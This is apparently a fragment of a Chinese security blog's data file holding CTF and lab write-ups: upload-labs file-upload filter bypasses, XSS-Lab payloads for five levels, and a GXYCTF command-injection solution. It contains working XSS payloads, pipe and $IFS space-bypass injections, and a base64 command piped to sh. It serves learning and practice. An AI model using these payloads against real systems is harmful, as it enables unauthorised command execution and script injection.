pool.join()</span><br></pre></td></tr></table></figure>\n\n<p>​    第一次用python的我在这里知道了<code>pip</code>。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119090033.png\"></p>\n<h2 id=\"Pass-18（失手）\"><a href=\"#Pass-18（失手）\" class=\"headerlink\" title=\"Pass-18（失手）\"></a>Pass-18（失手）</h2><p>​    18题失手了没有思路，如果使用<code>include.php</code>文件包含的话还可以，看了看网上大部分的博客都是敷敷衍衍过去的，找到了一篇稍微有点思路的，使用的是<code>apache2.2.x的解析漏洞</code>，这个漏洞的思路就是，apache服务器在解析有多个后缀名的文件时，从最后一个开始向前扫描，如果不认识就跳过，直到遇到一个认识的文件后缀，就把这个文件以这个能识别的后缀解析。</p>\n<p><a href=\"https://blog.csdn.net/qq_32434307/article/details/79480316\">Apache文件解析漏洞</a></p>\n<p><a href=\"https://www.cnblogs.com/yuzly/p/11226377.html\">apache httpd多后缀解析漏洞复现</a></p>\n<p>​    源码中还有一个可以突破的点是同样使用了<strong>重命名函数</strong>，所以应该还是可以使用竞争上传访问得到，但是使用了白名单验证，我实在是没招了所以<del>先摸为敬</del>。</p>\n<h2 id=\"Pass-19\"><a href=\"#Pass-19\" class=\"headerlink\" title=\"Pass-19\"></a>Pass-19</h2><p>（windows环境，php5.2.17，magic_quotes_gpc=Off）</p>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;php&quot;</span>,<span class=\"string\">&quot;php5&quot;</span>,<span class=\"string\">&quot;php4&quot;</span>,<span class=\"string\">&quot;php3&quot;</span>,<span class=\"string\">&quot;php2&quot;</span>,<span class=\"string\">&quot;html&quot;</span>,<span class=\"string\">&quot;htm&quot;</span>,<span class=\"string\">&quot;phtml&quot;</span>,<span class=\"string\">&quot;pht&quot;</span>,<span class=\"string\">&quot;jsp&quot;</span>,<span class=\"string\">&quot;jspa&quot;</span>,<span class=\"string\">&quot;jspx&quot;</span>,<span class=\"string\">&quot;jsw&quot;</span>,<span class=\"string\">&quot;jsv&quot;</span>,<span class=\"string\">&quot;jspf&quot;</span>,<span class=\"string\">&quot;jtml&quot;</span>,<span class=\"string\">&quot;asp&quot;</span>,<span class=\"string\">&quot;aspx&quot;</span>,<span class=\"string\">&quot;asa&quot;</span>,<span class=\"string\">&quot;asax&quot;</span>,<span class=\"string\">&quot;ascx&quot;</span>,<span class=\"string\">&quot;ashx&quot;</span>,<span class=\"string\">&quot;asmx&quot;</span>,<span class=\"string\">&quot;cer&quot;</span>,<span class=\"string\">&quot;swf&quot;</span>,<span class=\"string\">&quot;htaccess&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = pathinfo(<span class=\"variable\">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> .<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123; </span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    源码第七行使用了<strong>POST</strong>来接受文件的命名，前面有类似题的是使用了<strong>0x00截断上传</strong>，后面也同样是<code>move_uploaded_file</code>移动文件的函数，还使用了黑名单验证，方法就很明确，使用<strong>截断上传</strong>。别忘了截断上传需要的特定条件：php版本需要低于<code>5.3.29</code>、<code>magic_quotes_gpc</code>需要为关闭状态。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119164220.png\"></p>\n<p>​    同样是命名为<code>phpa</code>方便在十六进制表里修改为<code>00</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119162729.png\"></p>\n<p>​    打开图片把url链接<code>http://upload-labs/upload/upload-19.php�</code>修改一下即可。完工</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119164458.png\"></p>\n<p>​    其实这道题还有一个思路，因为题目使用了<strong>黑名单验证</strong>，分析源码没有设置大小写过滤，所以也可以使用大小写方法通过如<code>Php</code>，不演示了。</p>\n<h2 id=\"Pass-20\"><a href=\"#Pass-20\" class=\"headerlink\" title=\"Pass-20\"></a>Pass-20</h2><p>（LInux环境，php7.2.21）</p>\n<p>源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"comment\">//检查MIME</span></span><br><span class=\"line\">    <span class=\"variable\">$allow_type</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;image/jpeg&#x27;</span>,<span class=\"string\">&#x27;image/png&#x27;</span>,<span class=\"string\">&#x27;image/gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>],<span class=\"variable\">$allow_type</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//检查文件名</span></span><br><span class=\"line\">        <span class=\"variable\">$file</span> = <span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>]) ? <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>] : <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!is_array(<span class=\"variable\">$file</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$file</span> = explode(<span class=\"string\">&#x27;.&#x27;</span>, strtolower(<span class=\"variable\">$file</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$ext</span> = end(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">        <span class=\"variable\">$allow_suffix</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$ext</span>, <span class=\"variable\">$allow_suffix</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$file_name</span> = reset(<span class=\"variable\">$file</span>) . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$file</span>[count(<span class=\"variable\">$file</span>) - <span class=\"number\">1</span>];</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> .<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件上传成功！&quot;</span>;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件上传失败！&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    这道题使用了<code>MIME</code>验证和白名单验证。先看第10行使用了<code>三目运算符</code>判断<code>$_POST[&#39;save_name&#39;]</code>是否为空，若为空则执行<code>:</code>前获取上传文件的名称，若不为空则获取POST中的<code>save_name</code>。第11行使用了<code>is_array</code>函数判断是否是一个数组，然后使用<code>explode</code>截断文件名转换小写并返回数组。也就是说，如果我们POST中的<code>save_name</code>是个数组的就可以跳过11行的判断。15行使用<code>end</code>函数获取数组中的最后一个元素用于后缀验证。20行把文件名进行拼接：数组<strong>第一个</strong>元素+数组元素<strong>总数-1</strong>的那个元素。</p>\n<p>所以我们可以构造一个这样的数组用于绕过：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119170734.png\"></p>\n<p>​    数组[2]用于绕过白名单，文件名为：<code>数组[0].数组[1]</code>，但是数组[1]是空的所以只剩下<code>数组[0].</code>（后面有个点）</p>\n<p>​    别忘了还要绕过<strong>MIME</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119172340.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201119172415.png\"></p>\n<p>完工</p>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>​    Upload labs的20道题大部分完成了，有两道题没完成，但是也学到了不少东西，这些天再抽空写一个总结吧。射射观看。</p>\n"},{"title":"XSS-Lab (一)","date":"2020-11-03T02:13:39.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120856.jpg","_content":"\n## 头\n\n靶机地址：https://buuoj.cn/challenges#XSS-Lab\n\n![](https://s1.ax1x.com/2020/11/03/BsmJ5n.png)\n\n## level 1\n\n​\t![](https://s1.ax1x.com/2020/11/03/BsmfKO.png)\n\n​\t观察发现`欢迎用户test`与URL中的`name=test`字段对应，尝试修改发现可行。直接将`name`字段改为`name=<script>alert()</script>`，完工。\n\n\n\n## level 2\n\n![](https://s1.ax1x.com/2020/11/03/BsnwWt.png)\n\n​\t在搜索栏中的输入会回显到页面，查看网页源代码，发现值在`input`的`value`属性中\n\n![](https://s1.ax1x.com/2020/11/03/BsnLk9.png)\n\n​\t构造闭合`\"> <script>alert()</script> // `，构造以后的标签会变成`.... value=\"\"> <script>alert()</script> // \">`。完工\n\n\n\n## level 3\n\n![](https://s1.ax1x.com/2020/11/03/BsKwKf.png)\n\n​\t老样子构造`value`属性闭合，尝试`\"> <script>alert()</script> // `构造闭合，查看网页源代码发现语句变成`&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // `，说明把`\"、<、>、`进行了html编码过滤，尝试构造`onmouseover`事件(鼠标移到事件)，构造语句`'onmouseover='alert()'`。完工\n\n\n\n## level 4\n\n![](https://s1.ax1x.com/2020/11/03/BsMWYd.png)\n\n​\t构造闭合`\"> <script>alert()</script> // `，查看源代码发现进行了`>、<`过滤，尝试构造事件`\" onmouseover='alert()'`。完工\n\n​\t说明一下标签的事件有很多类型，可以自己试试别的事件响应。\n\n\n\n## level 5\n\n![](https://s1.ax1x.com/2020/11/03/Bs1Ci4.png)\n\n​\t检查一下都有什么过滤。发现有一下过滤\n\n>script --> scr_ipt\n>\n>onmouseover --> o_nmouseover\n\n无法采用事件，那么尝试构造一个标签` \"> <a href='javascript:alert()'>233</a> //`，发现`javascript`没有过滤，说明判断语句匹配值仅仅为`script`，点击构造的`<a>`标签内容。完工\n\n​\t","source":"_posts/XSS-Lab1.md","raw":"---\ntitle: XSS-Lab (一)\ndate: 2020-11-03 10:13:39\ntags: \n- XSS\ncategories:\n- DROPS\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201111120856.jpg\n---\n\n## 头\n\n靶机地址：https://buuoj.cn/challenges#XSS-Lab\n\n![](https://s1.ax1x.com/2020/11/03/BsmJ5n.png)\n\n## level 1\n\n​\t![](https://s1.ax1x.com/2020/11/03/BsmfKO.png)\n\n​\t观察发现`欢迎用户test`与URL中的`name=test`字段对应，尝试修改发现可行。直接将`name`字段改为`name=<script>alert()</script>`，完工。\n\n\n\n## level 2\n\n![](https://s1.ax1x.com/2020/11/03/BsnwWt.png)\n\n​\t在搜索栏中的输入会回显到页面，查看网页源代码，发现值在`input`的`value`属性中\n\n![](https://s1.ax1x.com/2020/11/03/BsnLk9.png)\n\n​\t构造闭合`\"> <script>alert()</script> // `，构造以后的标签会变成`.... value=\"\"> <script>alert()</script> // \">`。完工\n\n\n\n## level 3\n\n![](https://s1.ax1x.com/2020/11/03/BsKwKf.png)\n\n​\t老样子构造`value`属性闭合，尝试`\"> <script>alert()</script> // `构造闭合，查看网页源代码发现语句变成`&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // `，说明把`\"、<、>、`进行了html编码过滤，尝试构造`onmouseover`事件(鼠标移到事件)，构造语句`'onmouseover='alert()'`。完工\n\n\n\n## level 4\n\n![](https://s1.ax1x.com/2020/11/03/BsMWYd.png)\n\n​\t构造闭合`\"> <script>alert()</script> // `，查看源代码发现进行了`>、<`过滤，尝试构造事件`\" onmouseover='alert()'`。完工\n\n​\t说明一下标签的事件有很多类型，可以自己试试别的事件响应。\n\n\n\n## level 5\n\n![](https://s1.ax1x.com/2020/11/03/Bs1Ci4.png)\n\n​\t检查一下都有什么过滤。发现有一下过滤\n\n>script --> scr_ipt\n>\n>onmouseover --> o_nmouseover\n\n无法采用事件，那么尝试构造一个标签` \"> <a href='javascript:alert()'>233</a> //`，发现`javascript`没有过滤，说明判断语句匹配值仅仅为`script`，点击构造的`<a>`标签内容。完工\n\n​\t","slug":"XSS-Lab1","published":1,"updated":"2021-07-31T01:33:01.878Z","_id":"ckrr3f9az000whotc7fdda4t6","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"头\"><a href=\"#头\" class=\"headerlink\" title=\"头\"></a>头</h2><p>靶机地址：<a href=\"https://buuoj.cn/challenges#XSS-Lab\">https://buuoj.cn/challenges#XSS-Lab</a></p>\n<p><img src=\"https://s1.ax1x.com/2020/11/03/BsmJ5n.png\"></p>\n<h2 id=\"level-1\"><a href=\"#level-1\" class=\"headerlink\" title=\"level 1\"></a>level 1</h2><p>​    <img src=\"https://s1.ax1x.com/2020/11/03/BsmfKO.png\"></p>\n<p>​    观察发现<code>欢迎用户test</code>与URL中的<code>name=test</code>字段对应，尝试修改发现可行。直接将<code>name</code>字段改为<code>name=&lt;script&gt;alert()&lt;/script&gt;</code>，完工。</p>\n<h2 id=\"level-2\"><a href=\"#level-2\" class=\"headerlink\" title=\"level 2\"></a>level 2</h2><p><img src=\"https://s1.ax1x.com/2020/11/03/BsnwWt.png\"></p>\n<p>​    在搜索栏中的输入会回显到页面，查看网页源代码，发现值在<code>input</code>的<code>value</code>属性中</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/03/BsnLk9.png\"></p>\n<p>​    构造闭合<code>&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // </code>，构造以后的标签会变成<code>.... value=&quot;&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // &quot;&gt;</code>。完工</p>\n<h2 id=\"level-3\"><a href=\"#level-3\" class=\"headerlink\" title=\"level 3\"></a>level 3</h2><p><img src=\"https://s1.ax1x.com/2020/11/03/BsKwKf.png\"></p>\n<p>​    老样子构造<code>value</code>属性闭合，尝试<code>&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // </code>构造闭合，查看网页源代码发现语句变成<code>&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // </code>，说明把<code>&quot;、&lt;、&gt;、</code>进行了html编码过滤，尝试构造<code>onmouseover</code>事件(鼠标移到事件)，构造语句<code>&#39;onmouseover=&#39;alert()&#39;</code>。完工</p>\n<h2 id=\"level-4\"><a href=\"#level-4\" class=\"headerlink\" title=\"level 4\"></a>level 4</h2><p><img src=\"https://s1.ax1x.com/2020/11/03/BsMWYd.png\"></p>\n<p>​    构造闭合<code>&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // </code>，查看源代码发现进行了<code>&gt;、&lt;</code>过滤，尝试构造事件<code>&quot; onmouseover=&#39;alert()&#39;</code>。完工</p>\n<p>​    说明一下标签的事件有很多类型，可以自己试试别的事件响应。</p>\n<h2 id=\"level-5\"><a href=\"#level-5\" class=\"headerlink\" title=\"level 5\"></a>level 5</h2><p><img src=\"https://s1.ax1x.com/2020/11/03/Bs1Ci4.png\"></p>\n<p>​    检查一下都有什么过滤。发现有一下过滤</p>\n<blockquote>\n<p>script –&gt; scr_ipt</p>\n<p>onmouseover –&gt; o_nmouseover</p>\n</blockquote>\n<p>无法采用事件，那么尝试构造一个标签<code> &quot;&gt; &lt;a href=&#39;javascript:alert()&#39;&gt;233&lt;/a&gt; //</code>，发现<code>javascript</code>没有过滤，说明判断语句匹配值仅仅为<code>script</code>，点击构造的<code>&lt;a&gt;</code>标签内容。完工</p>\n<p>​    </p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"头\"><a href=\"#头\" class=\"headerlink\" title=\"头\"></a>头</h2><p>靶机地址：<a href=\"https://buuoj.cn/challenges#XSS-Lab\">https://buuoj.cn/challenges#XSS-Lab</a></p>\n<p><img src=\"https://s1.ax1x.com/2020/11/03/BsmJ5n.png\"></p>\n<h2 id=\"level-1\"><a href=\"#level-1\" class=\"headerlink\" title=\"level 1\"></a>level 1</h2><p>​    <img src=\"https://s1.ax1x.com/2020/11/03/BsmfKO.png\"></p>\n<p>​    观察发现<code>欢迎用户test</code>与URL中的<code>name=test</code>字段对应，尝试修改发现可行。直接将<code>name</code>字段改为<code>name=&lt;script&gt;alert()&lt;/script&gt;</code>，完工。</p>\n<h2 id=\"level-2\"><a href=\"#level-2\" class=\"headerlink\" title=\"level 2\"></a>level 2</h2><p><img src=\"https://s1.ax1x.com/2020/11/03/BsnwWt.png\"></p>\n<p>​    在搜索栏中的输入会回显到页面，查看网页源代码，发现值在<code>input</code>的<code>value</code>属性中</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/03/BsnLk9.png\"></p>\n<p>​    构造闭合<code>&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // </code>，构造以后的标签会变成<code>.... value=&quot;&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // &quot;&gt;</code>。完工</p>\n<h2 id=\"level-3\"><a href=\"#level-3\" class=\"headerlink\" title=\"level 3\"></a>level 3</h2><p><img src=\"https://s1.ax1x.com/2020/11/03/BsKwKf.png\"></p>\n<p>​    老样子构造<code>value</code>属性闭合，尝试<code>&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // </code>构造闭合，查看网页源代码发现语句变成<code>&amp;quot;&amp;gt; &amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt; // </code>，说明把<code>&quot;、&lt;、&gt;、</code>进行了html编码过滤，尝试构造<code>onmouseover</code>事件(鼠标移到事件)，构造语句<code>&#39;onmouseover=&#39;alert()&#39;</code>。完工</p>\n<h2 id=\"level-4\"><a href=\"#level-4\" class=\"headerlink\" title=\"level 4\"></a>level 4</h2><p><img src=\"https://s1.ax1x.com/2020/11/03/BsMWYd.png\"></p>\n<p>​    构造闭合<code>&quot;&gt; &lt;script&gt;alert()&lt;/script&gt; // </code>，查看源代码发现进行了<code>&gt;、&lt;</code>过滤，尝试构造事件<code>&quot; onmouseover=&#39;alert()&#39;</code>。完工</p>\n<p>​    说明一下标签的事件有很多类型，可以自己试试别的事件响应。</p>\n<h2 id=\"level-5\"><a href=\"#level-5\" class=\"headerlink\" title=\"level 5\"></a>level 5</h2><p><img src=\"https://s1.ax1x.com/2020/11/03/Bs1Ci4.png\"></p>\n<p>​    检查一下都有什么过滤。发现有一下过滤</p>\n<blockquote>\n<p>script –&gt; scr_ipt</p>\n<p>onmouseover –&gt; o_nmouseover</p>\n</blockquote>\n<p>无法采用事件，那么尝试构造一个标签<code> &quot;&gt; &lt;a href=&#39;javascript:alert()&#39;&gt;233&lt;/a&gt; //</code>，发现<code>javascript</code>没有过滤，说明判断语句匹配值仅仅为<code>script</code>，点击构造的<code>&lt;a&gt;</code>标签内容。完工</p>\n<p>​    </p>\n"},{"title":"GXYCTF2019 Ping Ping Ping","date":"2020-12-04T12:24:50.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120223448.jpg","_content":"\n# [GXYCTF2019]Ping Ping Ping\n\n题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping\n\n和DMCTF做的那道**pingpingping**类似，同样是使用管道符构造payload，先使用：\n\n```\n?ip=127.0.0.1|ls\n```\n\n目录下有两个文件：`flag.php`、`index.php`。首先试出来了空格被过滤，使用以下绕过空格：\n\n```\n$IFS\n${IFS}\n$IFS$1 //$1改成$加其他数字貌似都行\n< \n<> \n{cat,flag.php}  //用逗号实现了空格功能\n%20 \n%09 \n```\n\n在linux下反单引号里面的指令会被执行 **\\`ls\\`**\n\n```\n?ip=|cat$IFS`ls`\n```\n\n会输出该目录下所有可以打开的文件，可以查看**index.php**的部分源码有哪些过滤：\n\n```php\n/?ip=|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match)){\n    echo preg_match(\"/\\&|\\/|\\?|\\*|\\<|[\\x{00}-\\x{20}]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match);\n    die(\"fxck your symbol!\");\n  } else if(preg_match(\"/ /\", $ip)){\n    die(\"fxck your space!\");\n  } else if(preg_match(\"/bash/\", $ip)){\n    die(\"fxck your bash!\");\n  } else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip)){\n    die(\"fxck your flag!\");\n  }\n  $a = shell_exec(\"ping -c 4 \".$ip);\n  echo \"\n\";\n  print_r($a);\n}\n\n?>\n```\n\n一些基本的符号、空格、bash、任何形式的flag字眼都被过滤了。接下来就是找访问**flag.php**。在网上看了好多的题解，用了好多方法，但是网页输出都为空，原来以为和其他题目一样使用**readflag**的ELF执行文件访问，但是还没成功。其实执行：\n\n```\n?ip=|cat$IFS`ls`\n```\n\n这个payload的时候文件都已经输出了，我最后在网页源码找到了，原来是被注释了<span class='heimu'>我是傻逼</span>。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201205110806.png)\n\n**最后记录下学到的姿势和这道题目的其他思路**：\n\n* 管道符：\n  * `|`直接执行后面的语句。\n  * `||`如果前面语句错误，执行后面的语句。\n  * `&`前面和后面命令都要执行，无论前面真假，\n  * `&&`如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令\n\n* 使用以下绕过空格：\n\n```\n$IFS\n${IFS}\n${IFS}$1\n$IFS$1 //$1改成$加其他数字貌似都行\n<\n<> \n{cat,flag.php}  //用逗号实现了空格功能\n%20 \n%09 //需要php环境\n```\n\n* 覆盖源码里的`$a`变量（拼接变量）：\n\n```\n/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php\n```\n\n* 使用sh执行脚本：\n\n```\n/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh\n```\n\n* 内联执行：\n\n```\n/?ip=|cat$IFS`ls`\n```\n\n>附：大佬整理的博客（内含更多姿势）：[命令执行漏洞利用及绕过方式总结](https://www.ghtwf01.cn/index.php/archives/273/)","source":"_posts/[GXYCTF2019]Ping Ping Ping.md","raw":"---\ntitle: GXYCTF2019 Ping Ping Ping\ndate: 2020-12-04 20:24:50\ncategories:\n- DROPS\ntags:\n- Web\n- BUUCTF_Web\n- RCE\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120223448.jpg \n---\n\n# [GXYCTF2019]Ping Ping Ping\n\n题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping\n\n和DMCTF做的那道**pingpingping**类似，同样是使用管道符构造payload，先使用：\n\n```\n?ip=127.0.0.1|ls\n```\n\n目录下有两个文件：`flag.php`、`index.php`。首先试出来了空格被过滤，使用以下绕过空格：\n\n```\n$IFS\n${IFS}\n$IFS$1 //$1改成$加其他数字貌似都行\n< \n<> \n{cat,flag.php}  //用逗号实现了空格功能\n%20 \n%09 \n```\n\n在linux下反单引号里面的指令会被执行 **\\`ls\\`**\n\n```\n?ip=|cat$IFS`ls`\n```\n\n会输出该目录下所有可以打开的文件，可以查看**index.php**的部分源码有哪些过滤：\n\n```php\n/?ip=|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match)){\n    echo preg_match(\"/\\&|\\/|\\?|\\*|\\<|[\\x{00}-\\x{20}]|\\>|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match);\n    die(\"fxck your symbol!\");\n  } else if(preg_match(\"/ /\", $ip)){\n    die(\"fxck your space!\");\n  } else if(preg_match(\"/bash/\", $ip)){\n    die(\"fxck your bash!\");\n  } else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip)){\n    die(\"fxck your flag!\");\n  }\n  $a = shell_exec(\"ping -c 4 \".$ip);\n  echo \"\n\";\n  